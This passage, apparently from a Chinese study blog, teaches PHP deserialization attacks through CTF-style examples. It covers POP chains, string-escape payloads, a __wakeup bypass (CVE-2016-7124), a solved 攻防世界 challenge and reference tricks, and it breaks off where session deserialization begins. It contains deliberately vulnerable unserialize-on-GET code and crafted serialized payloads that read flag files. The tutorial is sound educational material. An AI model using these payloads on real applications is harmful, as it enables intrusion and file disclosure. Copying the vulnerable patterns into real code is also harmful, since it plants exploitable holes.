class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240422193805684.png" alt="image-20240422193805684"></p><p>构造代码,将上面代码复制下来，删去函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>=<span class="string">&quot;flag.php&quot;</span>;<span class="comment">//首先给var赋值，因为flag在flag.php里</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//赋值完后，首先调用appen方法就需要实例化这这个类，所以我们先new一个MOdifier</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="comment">//第二步触发get，给$p辅助对象Modifier，所以先new一个Test</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;p = <span class="variable">$a</span>;</span><br><span class="line"><span class="comment">//第三步触发toString，给str辅助对象Test，所以先new一个Show</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;str=<span class="variable">$c</span>;</span><br><span class="line"><span class="comment">//最后触发wakeup，给$source赋值对象Show</span></span><br><span class="line"><span class="variable">$b</span>-&gt;source = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240422201116529.png" alt="image-20240422201116529"></p><h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p><strong>反席列化分隔符</strong></p><p>反序列化以**;}**结束，后面的字符串不影响正常的反序列化</p><p><strong>属性逃逸</strong></p><p>一般在数据先经过一次serialize再经过unserialize，在这个中间反序列化的字符串<strong>变多</strong>或者<strong>变少</strong>的时候有可能存在反序列化属性逃逸。</p><p><img src="/../image/image-20240422203155467.png" alt="image-20240422203155467"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;abcsystem()system()system()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arga</span>,<span class="variable">$argc</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;v1 = <span class="variable">$arga</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;v2 = <span class="variable">$argc</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$a</span>,<span class="variable">$b</span>));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;system()&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240422203552916.png" alt="image-20240422203552916"></p><p><img src="/../image/image-20240422203729881.png" alt="image-20240422203729881"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arga</span>,<span class="variable">$argc</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1 = <span class="variable">$arga</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v2 = <span class="variable">$argc</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> =  <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$a</span>,<span class="variable">$b</span>));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;pwd&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240422204912778.png" alt="image-20240422204912778"></p><p><img src="/../image/image-20240422205523284.png" alt="image-20240422205523284"></p><p>例题：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&#x27;daydream&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;pass==<span class="string">&#x27;escaping&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240422210042900.png" alt="image-20240422210042900"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span> = <span class="string">&quot;benben&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">&quot;escaping&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br></pre></td></tr></table></figure><p>O:4:”test”:2:{s:4:”user”;s:6:”benben**”;s:4:”pass”;s:8:”escaping”;}**</p><p>加粗部分就是要逃逸的代码,$user是可以控制的，加粗部分一共29个字符，然后一个php吐出一个字符</p><p><img src="/../image/image-20240422210527195.png" alt="image-20240422210527195"></p><p>所以我们需要写29个php，所以</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$param</span>=<span class="string">&#x27;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240422211453318.png" alt="image-20240422211453318"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hk&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">false</span> ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>,<span class="variable">$pass</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;vip)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240422211955099.png" alt="image-20240422211955099"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">&quot;benben&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:4:&quot;flag&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240422212341637.png" alt="image-20240422212341637"></p><p><img src="/../image/image-20240422212356828.png" alt="image-20240422212356828"></p><p>user&#x3D;flagflagflagflagflagflagflagflagflagflag</p><p>pass&#x3D;1”;s:4:”pass”;s:6:”benben”;s:3:”vip”;b:1;}</p><p><img src="/../image/image-20240422212509444.png" alt="image-20240422212509444"></p><h2 id="wakeup-绕过-反序列化漏洞-CVE-2016-7124"><a href="#wakeup-绕过-反序列化漏洞-CVE-2016-7124" class="headerlink" title="__wakeup()绕过 反序列化漏洞:CVE-2016-7124"></a>__wakeup()绕过 反序列化漏洞:CVE-2016-7124</h2><p>PHP5&lt;5.6.25</p><p>PHP7&lt;7.0.10</p><p>漏洞产生原因:如果存在_wakeup方法，调用unserilize()方法前则先调用_wakeup方法，但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时，会跳过wakeup()的执行</p><p><img src="/../image/image-20240422213907834.png" alt="image-20240422213907834"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Are you daydreaming?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sercet in flag.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240422214302481.png" alt="image-20240422214302481"></p><p><img src="/../image/image-20240422214345007.png" alt="image-20240422214345007"></p><p><img src="/../image/image-20240422214428123.png" alt="image-20240422214428123"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo serialize(new secret());#O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;+号绕过过滤，2绕过wakeup</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240422214911144.png" alt="image-20240422214911144"></p><h3 id="攻防世界Web-php-unserialize"><a href="#攻防世界Web-php-unserialize" class="headerlink" title="攻防世界Web_php_unserialize"></a>攻防世界Web_php_unserialize</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>());<span class="comment">#O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);      <span class="comment">//绕过正则表达式过滤</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#echo urlencode($a);#O%3A%2B4%3A%22Demo%22%3A2%3A%7Bs%3A10%3A%22%2500Demo%2500file%22%3Bs%3A8%3A%22f14g.php%22%3B%7D</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;O%3A%2B4%3A%22Demo%22%3A2%3A%7Bs%3A10%3A%22%2500Demo%2500file%22%3Bs%3A8%3A%22f14g.php%22%3B%7D&#x27;</span>;</span><br><span class="line"><span class="comment">#$a = &#x27;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;%00Demo%00file&quot;;s:8:&quot;fl4g.php&quot;;&#125;&#x27;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64_encode()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240422220359368.png" alt="image-20240422220359368"></p><p>要注意的是，自己换空值好像不行，得保存后得字符串才行。</p><h3 id="引用的利用方式"><a href="#引用的利用方式" class="headerlink" title="引用的利用方式"></a>引用的利用方式</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="variable">$pass</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$o</span>) &#123;</span><br><span class="line">    <span class="variable">$o</span>-&gt;secret = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;enter)<span class="comment">#===表示</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulation! Here is my secret: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no... You can&#x27;t fool me&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;are you trolling?&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240422223643678.png" alt="image-20240422223643678"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">just4fun</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;enter =&amp; <span class="variable">$a</span>-&gt;secret;<span class="comment">#有点类似指向同一地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240422223947695.png" alt="image-20240422223947695"></p><h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>当session start()被调用或者php.ini中session.auto start为1时PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录(默认为&#x2F;tmp)<br><strong>存取数据的格式有多种，常用的有三种：</strong></p><table><thead><tr><th>处理器</th><th>对应得存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过serialize()函数序列化处理得值</td></tr><tr><td>php_serialize(php&gt;&#x3D;5.5.4)</td><td>经过序列化处理得数组</td></tr><tr><td>php_binary</td><td>键名长度对应得ASCII字符+键名+经过反序列化处理得值</td></tr></tbody></table><p><strong>漏洞产生:写入格式和读取格式不一致</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;benben&#x27;</span>] 